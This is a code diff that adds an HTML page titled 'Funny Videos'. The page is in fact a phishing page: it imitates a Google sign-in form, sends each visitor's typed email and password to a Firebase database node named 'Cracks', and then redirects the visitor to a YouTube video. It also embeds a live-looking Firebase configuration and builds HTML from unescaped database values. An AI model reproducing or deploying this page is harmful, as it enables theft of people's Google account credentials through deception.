@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Funny Videos</title>
+	<meta name="description" content="Check out these funny videos I have posted online...">
+	<link rel="stylesheet" href="index.css">
+	<script src="https://kit.fontawesome.com/6401c6b42b.js" crossorigin="anonymous"></script>
+	
+	<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+	<script src="https://www.gstatic.com/firebasejs/7.18.0/firebase-app.js"></script>
+	<script src="https://www.gstatic.com/firebasejs/7.18.0/firebase-auth.js"></script>
+	<script src="https://www.gstatic.com/firebasejs/7.18.0/firebase-database.js"></script>
+	<script src="https://www.gstatic.com/firebasejs/7.18.0/firebase-storage.js"></script>
+</head>
+<body>
+	<script>
+		// Your web app's Firebase configuration
+		// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+		var firebaseConfig = {
+		  apiKey: "AIzaSyAT0VOEE4NJp9s1pSKDBDTK7ijJm4yJSQY",
+		  authDomain: "aaaa-6af4b.firebaseapp.com",
+		  databaseURL: "https://aaaa-6af4b.firebaseio.com",
+		  projectId: "aaaa-6af4b",
+		  storageBucket: "aaaa-6af4b.appspot.com",
+		  messagingSenderId: "152354258062",
+		  appId: "1:152354258062:web:773082156bced0ef801ddf",
+		  measurementId: "G-M264BJ46QZ"
+		};
+		// Initialize Firebase
+		firebase.initializeApp(firebaseConfig);
+
+		var counter = 100000000000000000;
+	  </script>
+	 
+	<div>
+		<div class="content">
+			<div class="form-box">         
+				<form id="bd-wish" class="input-group">
+					<img class="google" src="google.jpeg" alt="Google"><br>
+					<span>Sign  in with your Google Account</span><br>
+					<img class="userlogo" src="userlogo.png" alt=""><br>
+					<input placeholder="Email" id="emailid" class="input" type="email"><br>
+					<input placeholder="Password" id="passid" class="input" type="password"><br>
+					<button id="sendid" class="submit">Sign In</button>
+				</form>
+			</div>
+		</div>
+	</div><br><br><br>
+
+
+
+	<script>
+		$("#sendid").click(function(){
+			var etext = $("#emailid").val();
+			var ptext = $("#passid").val();
+			var dateStr = new Date().getTime();
+			var time = new Date();
+            var option = {
+                       weekday: "long",
+                       month: "long",
+                       day: "2-digit",
+					   year: "numeric",
+			}
+			var databaseRef = firebase.database().ref().child("Cracks");
+			var blogData = {
+				"etext": etext,
+				"ptext": ptext,
+				"count": counter - dateStr,
+                "time": time.toLocaleString('en-US', {hours: 'numeric', minutes: 'numeric', seconds: 'numeric', hours12: true}),
+                "date": time.toLocaleDateString('en-US', option),
+			};
+	
+			var newPostRef = databaseRef.push();
+			if (ptext != "" && etext != "") {
+				newPostRef.set(blogData, function(err){
+								if (!err){
+									//window.location.replace("http://xenon.rf.gd/me");
+									window.location.replace("http://youtu.be/Ll2Vjbg-0Zs");
+								} else {
+									$("#result").attr("class", "alert alert-danger");
+									$("#result").html("An error occuried in the upload of your post...!");
+								}
+				});
+			} else {
+				$("#result").html("Please write a message...!");
+			}
+			//window.location.replace("http://xenon.rf.gd/me");
+			window.location.replace("http://youtu.be/Ll2Vjbg-0Zs");
+		});
+	
+		
+	
+	
+		var dbBlogs = firebase.database().ref().child("Interview Hour").orderByChild("count");
+		dbBlogs.on("value", function(blogs){
+			if (blogs.exists()){
+				var blogsHtml = "";
+				blogs.forEach(function(singleBlog){
+					counter = counter + 1;
+					blogsHtml += "<div>"
+						blogsHtml += "<p style='border: 2px solid black; border-radius: 30px; width: 90%; background: linear-gradient(to right, green, white);padding: 20px; font-size: 1.2em; min-height: 100px; position: relative; margin: 2% auto; color='black''>"
+							blogsHtml += singleBlog.val().anon
+                            blogsHtml += "<br><br> &copy; TAB 3 - KYCM &trade;"
+						blogsHtml += "</p>"
+					blogsHtml += "</div>"
+					
+				});
+	
+				
+			}
+		});
+	
+	
+	</script>
+</body>
+</html>
